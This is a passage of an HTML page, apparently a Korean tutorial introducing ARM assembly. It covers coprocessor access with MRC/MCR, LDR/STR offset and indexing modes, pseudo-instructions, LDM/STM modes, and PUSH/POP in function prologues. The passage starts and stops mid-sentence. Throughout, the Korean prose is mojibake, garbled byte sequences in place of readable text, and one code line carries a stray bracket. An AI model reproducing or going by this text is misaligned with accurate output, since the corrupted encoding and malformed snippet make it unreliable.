ì—”ë””ì–¸ì…ë‹ˆë‹¤.</li></ul></li><li><code>T</code> (Thumb ë¹„íŠ¸) - Thumb ìƒíƒœì¸ ê²½ìš° 1ì…ë‹ˆë‹¤.</li><li><code>M</code> (Mode í•„ë“œ) - í˜„ì¬ íŠ¹ê¶Œ ìˆ˜ì¤€(e.g. User, Supervisor)ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.</li></ul><p><img src="/images/arm-1-introduction/3.png" alt="3.png"></p><h2 id="%EB%B3%B4%EC%A1%B0-%ED%94%84%EB%A1%9C%EC%84%B8%EC%84%9C%EC%99%80-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EC%84%A4%EC%A0%95" tabindex="-1">ë³´ì¡° í”„ë¡œì„¸ì„œì™€ ì‹œìŠ¤í…œ ì„¤ì •</h2><p>ARM ì•„í‚¤í…ì²˜ëŠ” í™•ì¥ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ê³¼ ì‹œìŠ¤í…œ ì„¤ì •ì„ ìœ„í•´ ì‚¬ìš©ë˜ëŠ” ë³´ì¡° í”„ë¡œì„¸ì„œ(coprocessors)ë¥¼ ì œê³µí•©ë‹ˆë‹¤. (e.g. x86/64ì—ì„œëŠ” ì‹œìŠ¤í…œ ì„¤ì •ì„ <code>CR0</code> , <code>CR4</code> ë ˆì§€ìŠ¤í„°ì—, ARMì—ì„œëŠ” <code>CP15</code> ë ˆì§€ìŠ¤í„°ì— ë³´ê´€í•©ë‹ˆë‹¤) ë³´ì¡° í”„ë¡œì„¸ì„œëŠ” <code>CP0</code> , <code>CP1</code> , â€¦ , <code>CP15</code> ì˜ 16ê°œê°€ ì¡´ì¬í•©ë‹ˆë‹¤. (ì½”ë“œì—ì„œëŠ” <code>P0</code> , â€¦ , <code>P15</code> ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤) <code>CP14</code> ì™€ <code>CP15</code> ëŠ” ë””ë²„ê¹…ê³¼ ì‹œìŠ¤í…œ ì„¤ì •ì„ ìœ„í•´ ì‚¬ìš©ë˜ê³ , ë‚˜ë¨¸ì§€ëŠ” ì œì¡°ì‚¬ê°€ íŠ¹ì •í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„(e.g. ë¶€ë™ì†Œìˆ˜ì  ì—°ì‚°) êµ¬í˜„í•˜ê¸° ìœ„í•´ ì„ íƒì ìœ¼ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ê°ê°ì˜ ë³´ì¡° í”„ë¡œì„¸ì„œëŠ” 16ê°œì˜ ë ˆì§€ìŠ¤í„°ì™€ 8ê°œì˜ opcodeë¥¼ ê°€ì§€ê³  ìˆìœ¼ë©°, opcodeì˜ ì‹œë§¨í‹±(semantic)ì€ í”„ë¡œì„¸ì„œë§ˆë‹¤ ë‹¤ë¦…ë‹ˆë‹¤. ë³´ì¡° í”„ë¡œì„¸ì„œì— ëŒ€í•œ ì ‘ê·¼ì€ ì˜¤ì§ <code>MRC</code> , <code>MCR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‚¬ìš©í•œ ì½ê¸°ì™€ ì“°ê¸°ë§Œ ê°€ëŠ¥í•©ë‹ˆë‹¤. (e.g. <code>MRC P15, 0, R0, C2, C0, 0</code> ì€ ë³´ì¡° í”„ë¡œì„¸ì„œ <code>CP15</code> ì˜ <code>C2</code> / <code>C0</code> ë ˆì§€ìŠ¤í„°ë¥¼ opcode <code>0</code> / <code>0</code> ìœ¼ë¡œ ì½ì–´ ë²”ìš© ë ˆì§€ìŠ¤í„° <code>R0</code> ì— ëŒ€ì…í•©ë‹ˆë‹¤) <code>MRC</code> ì™€ <code>MCR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ìì²´ëŠ” ë†’ì€ íŠ¹ê¶Œ ìˆ˜ì¤€ì„ ìš”êµ¬í•˜ì§€ ì•Šì§€ë§Œ, ì¼ë¶€ ë³´ì¡° í”„ë¡œì„¸ì„œì˜ ë ˆì§€ìŠ¤í„°ì™€ opcodeë“¤ì€ ì˜¤ë¡œì§€ Supervisor ìˆ˜ì¤€ì—ì„œë§Œ ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì´ë“¤ ë ˆì§€ìŠ¤í„°ë¥¼ User ìˆ˜ì¤€ì—ì„œ ì½ìœ¼ë ¤ í•˜ë©´ ìµì…‰ì…˜ì´ ë°œìƒí•  ê²ƒì…ë‹ˆë‹¤.</p><h2 id="%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98-%EC%A7%91%ED%95%A9%EC%9D%98-%ED%8A%B9%EC%A7%95" tabindex="-1">ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì§‘í•©ì˜ íŠ¹ì§•</h2><p>ì¡°ê±´ë¶€ ì‹¤í–‰ì´ë‚˜ ë°°ëŸ´ ì‹œí”„í„° ì™¸ì—ë„, ARM ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì—ëŠ” x86ì— ì—†ëŠ” íŠ¹ì§•ë“¤ì´ ìˆìŠµë‹ˆë‹¤.</p><ol><li>ì¼ë¶€ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë ˆì§€ìŠ¤í„°ì˜ ë²”ìœ„ë¥¼ ì¸ìë¡œ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<ul><li>e.g. <code>STM R1, &#123;R6-R10&#125;</code> ì€ ë ˆì§€ìŠ¤í„° <code>R1</code> ì´ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì— <code>R6</code> , <code>R7</code> , â€¦ , <code>R10</code> ì˜ 5ê°œ ê°’ì„ ìˆœì„œëŒ€ë¡œ ì”ë‹ˆë‹¤.</li><li>ì—°ì†í•˜ì§€ ì•ŠëŠ” ë ˆì§€ìŠ¤í„°ë“¤ë„ ì‰¼í‘œë¥¼ ì‚¬ìš©í•´ì„œ(e.g. <code>&#123;R1,R5,R8&#125;</code>) ì¸ìë¡œ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>ì¼ë¶€ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ì½ê¸°, ì“°ê¸° ì´í›„ ì„ íƒì ìœ¼ë¡œ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ì˜ ê°’ì„ ê°±ì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<ul><li>e.g. <code>STM SP!, &#123;R6-R10&#125;</code> ì„ ì‹¤í–‰í•˜ë©´ <code>SP</code> ì˜ ê°’ì€ <code>R10</code> ì˜ ê°’ì´ ì“°ì¸ ì£¼ì†Œì˜ 4ë°”ì´íŠ¸ ë’¤ë¡œ ê°±ì‹ ë©ë‹ˆë‹¤.</li></ul></li></ol><h2 id="load%EC%99%80-store-%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98" tabindex="-1">Loadì™€ Store ì¸ìŠ¤íŠ¸ëŸ­ì…˜</h2><h3 id="ldr-%EA%B3%BC-str" tabindex="-1"><code>LDR</code> ê³¼ <code>STR</code></h3><p><code>LDR</code> ê³¼ <code>STR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë©”ëª¨ë¦¬ì—ì„œ 1ë°”ì´íŠ¸, 2ë°”ì´íŠ¸ ë˜ëŠ” 4ë°”ì´íŠ¸ë¥¼ ì½ê³  ì”ë‹ˆë‹¤. ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ë¬¸ë²•ì€ ì‚´ì§ ë³µì¡í•œë°, ì˜¤í”„ì…‹ì„ ì§€ì •í•˜ê±°ë‚˜ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¥¼ ê°±ì‹ í•˜ëŠ” ì—¬ëŸ¬ ê°€ì§€ ë°©ë²•ì´ ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ê°€ì¥ ë‹¨ìˆœí•œ ê²½ìš°ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn]        <span class="comment">; Rt = *Rn</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn]        <span class="comment">; *Rn = Rt</span></span><br></pre></td></tr></table></figure><p><code>LDR</code> , <code>STR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ì™€ ì˜¤í”„ì…‹ì„ ì¸ìë¡œ ë°›ëŠ”ë°, ì˜¤í”„ì…‹ì˜ í˜•íƒœê°€ 3ê°€ì§€ ìˆê³  ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¥¼ ê°±ì‹ í•˜ëŠ” ë°©ë²•ì´ 3ê°€ì§€ ìˆìŠµë‹ˆë‹¤. ë¨¼ì € 3ê°€ì§€ì˜ ì˜¤í”„ì…‹ í˜•íƒœë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.</p><ol><li>ìƒìˆ˜ê°€ ì˜¤í”„ì…‹ì¸ ê²½ìš°<ul><li>ìƒìˆ˜ ê°’(immediate)ì€ ë‹¨ìˆœíˆ ì •ìˆ˜ë¡œ, íŠ¹ì • ì˜¤í”„ì…‹ì˜ ë°ì´í„°ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ì— ë”í•˜ê±°ë‚˜ ë¹¼ëŠ” ê²½ìš°ì…ë‹ˆë‹¤. (e.g. êµ¬ì¡°ì²´, vtableì˜ íŠ¹ì • í•„ë“œ ì ‘ê·¼)</li></ul></li></ol><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, imm]   <span class="comment">; Rt = *(Rn + imm)</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn, imm]   <span class="comment">; *(Rn + imm) = Rt</span></span><br></pre></td></tr></table></figure><ol start="2"><li>ë ˆì§€ìŠ¤í„°ê°€ ì˜¤í”„ì…‹ì¸ ê²½ìš°<ul><li>ë³´í†µ ë°°ì—´ì— ì ‘ê·¼í•˜ëŠ”ë°, ì¸ë±ìŠ¤ê°€ ëŸ°íƒ€ì„ì— ê³„ì‚°ë˜ëŠ” ê²½ìš°ì…ë‹ˆë‹¤.</li></ul></li></ol><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, Rm]    <span class="comment">; Rt = *(Rn + Rm)</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn, Rm]    <span class="comment">; *(Rn + Rm) = Rt</span></span><br></pre></td></tr></table></figure><ol start="3"><li>ë ˆì§€ìŠ¤í„°ì˜ ì •ìˆ˜ë°°ê°€ ì˜¤í”„ì…‹ì¸ ê²½ìš°<ul><li>ë³´í†µ ë°˜ë³µë¬¸ ì•ˆì—ì„œ ë°°ì—´ì„ ìˆœíšŒí•˜ë©´ì„œ, ì›ì†Œì˜ í¬ê¸° ë‹¨ìœ„ë¡œ í¬ì¸í„°ë¥¼ ì¦ê°€ì‹œí‚¤ëŠ” ê²½ìš°ì…ë‹ˆë‹¤.</li></ul></li></ol><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, Rm, shift]     <span class="comment">; Rt = *(Rn + Rm * shift)</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn, Rm, shift]     <span class="comment">; *(Rn + Rm * shift) = Rt</span></span><br></pre></td></tr></table></figure><p>ë‹¤ìŒìœ¼ë¡œ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¥¼ ê°±ì‹ í•˜ëŠ” 3ê°€ì§€ ë°©ë²•ì…ë‹ˆë‹¤.</p><ol><li>ì˜¤í”„ì…‹ ë°©ì‹<ul><li>ê°€ì¥ ë‹¨ìˆœí•˜ê³  í”í•œ ë°©ì‹ìœ¼ë¡œ, ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ëŠ” ì ˆëŒ€ ê°±ì‹ ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</li><li>ëŠë‚Œí‘œ(<code>!</code>)ê°€ ì—†ê³  ìƒìˆ˜ê°€ ëŒ€ê´„í˜¸ ì•ˆì— ìˆìœ¼ë©´ ì˜¤í”„ì…‹ ë°©ì‹ì…ë‹ˆë‹¤.</li></ul></li></ol><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, offset]        <span class="comment">; Rt = *(Rn + offset)</span></span><br></pre></td></tr></table></figure><ol start="2"><li>pre-indexed ë°©ì‹<ul><li>ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¥¼ ë¨¼ì € ê°±ì‹ í•œ í›„ ì°¸ì¡°í•©ë‹ˆë‹¤. (Cì–¸ì–´ì˜ ì „ìœ„ ì—°ì‚°ìì™€ ìœ ì‚¬)</li></ul></li></ol><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, offset]!       <span class="comment">; Rt = *(Rn + offset)</span></span><br><span class="line">                            <span class="comment">; Rn = Rn + offset</span></span><br></pre></td></tr></table></figure><ol start="3"><li>post-indexed ë°©ì‹<ul><li>ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¥¼ ë¨¼ì € ì°¸ì¡°í•œ í›„ ê°±ì‹ í•©ë‹ˆë‹¤. (Cì–¸ì–´ì˜ í›„ìœ„ ì—°ì‚°ìì™€ ìœ ì‚¬)</li></ul></li></ol><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn], offset]       <span class="comment">; Rt = *Rn</span></span><br><span class="line">                            <span class="comment">; Rn = Rn + offset</span></span><br></pre></td></tr></table></figure><h3 id="ldr-%EA%B3%BC-pseudo-%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98" tabindex="-1"><code>LDR</code> ê³¼ pseudo ì¸ìŠ¤íŠ¸ëŸ­ì…˜</h3><p>ì¼ë¶€ ë””ìŠ¤ì–´ì…ˆë¸” ê²°ê³¼ì—ì„œ ë‹¤ìŒê³¼ ê°™ì´ <code>LDR</code> ì„ ì‚¬ìš©í•˜ëŠ” ë°©ì‹ì„ ë³¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">LDR.W</span> <span class="built_in">R8</span>, <span class="number">=0x2932E00</span>        <span class="comment">; LDR R8, [PC, x]</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R2</span>, <span class="symbol">=a04d</span> <span class="comment">; &quot;%04d&quot;      ; LDR R2, [PC, y]</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, <span class="symbol">=__imp_realloc</span>      <span class="comment">; LDR R3, [PC, z]</span></span><br></pre></td></tr></table></figure><p>ì´ ë°©ì‹ì€ ì‚¬ì‹¤ pseudo ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ, ë””ìŠ¤ì–´ì…ˆë¸”ëŸ¬ë“¤ì´ í¸ì˜ìƒ ìœ„ì™€ ê°™ì´ ë‚˜íƒ€ë‚´ëŠ” ê²ƒì…ë‹ˆë‹¤. ì‹¤ì œë¡œëŠ” <code>PC</code> ë¥¼ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¡œ, ìƒìˆ˜ë¥¼ ì˜¤í”„ì…‹ìœ¼ë¡œ í•˜ëŠ” PC-relative ë°©ì‹ì˜ <code>LDR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì…ë‹ˆë‹¤.</p><p>ë‹¤ë¥¸ pseudo ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ ë ˆì´ë¸”ì´ë‚˜ í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ë ˆì§€ìŠ¤í„°ì— ëŒ€ì…í•˜ëŠ” <code>ADR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ìˆìŠµë‹ˆë‹¤. ë³´í†µ ì í”„ í…Œì´ë¸”ì´ë‚˜ ì½œë°± êµ¬í˜„ì— ì‚¬ìš©ë˜ëŠ”ë°, ë§ˆì°¬ê°€ì§€ë¡œ ë‚´ë¶€ì ìœ¼ë¡œëŠ” PC-relative ë°©ì‹ì˜ <code>LDR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADR</span> <span class="built_in">R5</span>, dword_9528</span><br><span class="line"><span class="symbol">LDRD.W</span> <span class="built_in">R4</span>, <span class="built_in">R5</span>, [<span class="built_in">R5</span>]</span><br></pre></td></tr></table></figure><h3 id="ldm-%EA%B3%BC-stm" tabindex="-1"><code>LDM</code> ê³¼ <code>STM</code></h3><p><code>LDM</code> ê³¼ <code>STM</code> ì€ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì—ì„œ ì—¬ëŸ¬ ê°œì˜ ê°’ì„ í•œë²ˆì— ì½ê³  ì”ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">LDM</span>&lt;mode&gt; Rn[!], &#123;Rm&#125;</span><br><span class="line"><span class="symbol">STM</span>&lt;mode&gt; Rn[!], &#123;Rm&#125;</span><br></pre></td></tr></table></figure><p><code>Rn</code> ì€ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¡œ, ê°’ì„ ì½ê³  ì“¸ ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚µë‹ˆë‹¤. ëŠë‚Œí‘œ(<code>!</code>)ëŠ” ì„ íƒì¸ë°, ëŠë‚Œí‘œê°€ ìˆìœ¼ë©´ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¥¼ ì‹¤í–‰ í›„ ê°±ì‹ í•¨ì„(writeback) ì˜ë¯¸í•©ë‹ˆë‹¤. <code>Rm</code> ì€ ë ˆì§€ìŠ¤í„°ë“¤ì˜ ë²”ìœ„ì´ë©°, <code>mode</code> ëŠ” ë‹¤ìŒê³¼ ê°™ì´ 4ê°€ì§€ê°€ ì¡´ì¬í•©ë‹ˆë‹¤.</p><ol><li><code>IA</code> (increment after) - <code>ë² ì´ìŠ¤ ì£¼ì†Œ</code> ë¶€í„° ê°’ì„ ì½ê³  ì“°ë©°, writebackì€ <code>ë§ˆì§€ë§‰ìœ¼ë¡œ ì½ê³  ì“´ ì£¼ì†Œ + 4</code> ì…ë‹ˆë‹¤.<ul><li>ëª…ì‹œëœ <code>mode</code> ê°€ ì—†ëŠ” ê²½ìš° ê¸°ë³¸ê°’ì…ë‹ˆë‹¤.</li></ul></li><li><code>IB</code> (increment before) - <code>ë² ì´ìŠ¤ ì£¼ì†Œ + 4</code> ë¶€í„° ê°’ì„ ì½ê³  ì“°ë©°, writebackì€ <code>ë§ˆì§€ë§‰ìœ¼ë¡œ ì½ê³  ì“´ ì£¼ì†Œ</code> ì…ë‹ˆë‹¤.</li><li><code>DA</code> (decrement after) - <code>ë² ì´ìŠ¤ ì£¼ì†Œ</code> ë¶€í„° ë‚®ì€ ë°©í–¥ìœ¼ë¡œ(ê±°ê¾¸ë¡œ) ê°’ì„ ì½ê³  ì“°ë©°, writebackì€ <code>ë§ˆì§€ë§‰ìœ¼ë¡œ ì½ê³  ì“´ ì£¼ì†Œ - 4</code> ì…ë‹ˆë‹¤.</li><li><code>DB</code> (decrement before) - <code>ë² ì´ìŠ¤ ì£¼ì†Œ - 4</code> ë¶€í„° ë‚®ì€ ë°©í–¥ìœ¼ë¡œ(ê±°ê¾¸ë¡œ) ê°’ì„ ì½ê³  ì“°ë©°, writebackì€ <code>ë§ˆì§€ë§‰ìœ¼ë¡œ ì½ê³  ì“´ ì£¼ì†Œ</code> ì…ë‹ˆë‹¤.</li></ol><p>ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒì€ <code>IA</code> ëª¨ë“œì™€ writebackì„ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ ê°’ì„ ì½ê³  ì“°ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> <span class="built_in">R6</span>, <span class="symbol">=mem</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="number">#10</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R1</span>, <span class="number">#11</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R2</span>, <span class="number">#12</span></span><br><span class="line"><span class="keyword">LDM</span> <span class="built_in">R6</span>!, &#123;<span class="built_in">R3</span>,<span class="built_in">R4</span>,<span class="built_in">R5</span>&#125;</span><br><span class="line"><span class="keyword">STMIA</span> <span class="built_in">R6</span>!, &#123;<span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/arm-1-introduction/4.png" alt="4.png"></p><p><code>LDM</code> ê³¼ <code>STM</code> ì€ í•œë²ˆì— ì—¬ëŸ¬ ê°’ì„ ì˜®ê¸¸ ìˆ˜ ìˆì–´, ë³´í†µ ë¸”ë¡ ë‹¨ìœ„ì˜ ë³µì‚¬ ë“±ì— ì‚¬ìš©ë©ë‹ˆë‹¤. (e.g. ë³µì‚¬í•  ê¸¸ì´ë¥¼ ì»´íŒŒì¼ ì‹œì ì— ì•Œê³  ìˆì„ ê²½ìš°, <code>memcpy</code> ëŒ€ì‹  ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤) ë˜í•œ ARM ìƒíƒœì—ì„œ í•¨ìˆ˜ì˜ ì‹œì‘ê³¼ ëì—ì„œë„ ì‚¬ìš©ë˜ëŠ”ë°, í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸ì™€ ì—í•„ë¡œê·¸ì˜ ì—­í• ì„ í•©ë‹ˆë‹¤.</p><ul><li><code>STMFD</code> ì™€ <code>LDMFD</code> ëŠ” ê°ê° <code>STMDB</code> , <code>LDMIA</code> ì˜ pseudo ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì…ë‹ˆë‹¤.</li></ul><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">STMFD</span> <span class="built_in">SP</span>!, &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;      <span class="comment">; ë ˆì§€ìŠ¤í„°ì™€ ë¦¬í„´ ì£¼ì†Œë¥¼ ìŠ¤íƒì— ë³´ê´€í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">LDMFD</span> <span class="built_in">SP</span>!, &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;      <span class="comment">; ë ˆì§€ìŠ¤í„°ì™€ ë¦¬í„´ ì£¼ì†Œë¥¼ êº¼ë‚´ê³  ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br></pre></td></tr></table></figure><h2 id="push-%EC%99%80-pop" tabindex="-1"><code>PUSH</code> ì™€ <code>POP</code></h2><p><code>PUSH</code> ì™€ <code>POP</code> ì€ <code>LDM</code> , <code>STM</code> ê³¼ ë¹„ìŠ·í•˜ì§€ë§Œ, ë‘ ê°€ì§€ ë‹¤ë¥¸ íŠ¹ì§•ì´ ìˆìŠµë‹ˆë‹¤.</p><ul><li><code>PUSH</code> ì™€ <code>POP</code> ì€ <code>SP</code> ë¥¼ ë² ì´ìŠ¤ ì£¼ì†Œë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤.</li><li>ì‹¤í–‰ í›„ <code>SP</code> ê°€ ìë™ìœ¼ë¡œ ê°±ì‹ ë©ë‹ˆë‹¤.</li></ul><p>ARM ì•„í‚¤í…ì²˜ì—ì„œë„ ìŠ¤íƒì€ x86/64ì™€ ë§ˆì°¬ê°€ì§€ë¡œ ë‚®ì€ ë°©í–¥ìœ¼ë¡œ ìëë‹ˆë‹¤. ë¬¸ë²•ì€ ë‹¤ìŒê³¼ ê°™ìœ¼ë©°, <code>&#123;Rn&#125;</code> ì—ëŠ” ë ˆì§€ìŠ¤í„°ë“¤ì˜ ë²”ìœ„ë¥¼ ì „ë‹¬í•´ì•¼ í•©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> &#123;Rn&#125;</span><br><span class="line"><span class="keyword">POP</span> &#123;Rn&#125;</span><br></pre></td></tr></table></figure><p>ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒì€ <code>PUSH</code> ì™€ <code>POP</code> ì„ ì´ìš©í•´ ìŠ¤íƒì—ì„œ ê°’ì„ ì½ê³  ì“°ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">MOV.W</span> <span class="built_in">R0</span>, <span class="number">#10</span></span><br><span class="line"><span class="symbol">MOV.W</span> <span class="built_in">R1</span>, <span class="number">#11</span></span><br><span class="line"><span class="symbol">MOV.W</span> <span class="built_in">R2</span>, <span class="number">#12</span></span><br><span class="line"><span class="keyword">PUSH</span> &#123;<span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span>&#125;</span><br><span class="line"><span class="keyword">POP</span> &#123;<span class="built_in">R3</span>,<span class="built_in">R4</span>,<span class="built_in">R5</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/arm-1-introduction/5.png" alt="5.png"></p><p><code>PUSH</code> ì™€ <code>POP</code> ì€ í”íˆ Thumb ìƒíƒœì—ì„œ í•¨ìˆ˜ì˜ í”„ë¡¤ë¡œê·¸ì™€ ì—í•„ë¡œê·¸ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">PUSH.W</span> &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;          <span class="comment">; ë ˆì§€ìŠ¤í„°ì™€ ë¦¬í„´ ì£¼ì†Œë¥¼ ìŠ¤íƒì— ë³´ê´€í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">POP.W</span> &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;           <span class="comment">; ë ˆì§€ìŠ¤í„°ì™€ ë¦¬í„´ ì£¼ì†Œë¥¼ êº¼ë‚´ê³  ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br></pre></td></tr></table></figure><h2 id="%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C%EA%B3%BC-%EB%B6%84%EA%B8%B0" tabindex="-1">í•¨ìˆ˜ í˜¸ì¶œê³¼ ë¶„ê¸°</h2><p>ARM ì•„í‚¤í…ì²˜ëŠ” ëª©ì ì§€ ì£¼ì†Œë¥¼ ì¸ì½”ë”©í•œ ë°©ì‹ì— ë”°ë¼ í•¨ìˆ˜ í˜¸ì¶œê³¼ ë¶„ê¸°ë¥¼ ìœ„í•œ ë‹¤ì–‘í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì œê³µí•˜ê³  ìˆìŠµë‹ˆë‹¤. í•¨ìˆ˜ í˜¸ì¶œì˜ ë¦¬í„´ì˜ ì›ë¦¬ëŠ” x86/64ì™€ ê¸°ë³¸ì ìœ¼ë¡œ ê°™ì§€ë§Œ, ëª‡ ê°€ì§€ ì‚¬ì†Œí•œ ì°¨ì´ì ë“¤ì´ ìˆìŠµë‹ˆë‹¤.</p><ol><li>ë¦¬í„´ ì£¼ì†Œë¥¼ ìŠ¤íƒì´ë‚˜ ë§í¬ ë ˆì§€ìŠ¤í„°(<code>LR</code>)ì— ì €ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<ul><li>í•¨ìˆ˜ ì—í•„ë¡œê·¸ì—ì„œ ë¦¬í„´ ì‹œ <code>POP &#123;PC&#125;</code> ì™€ 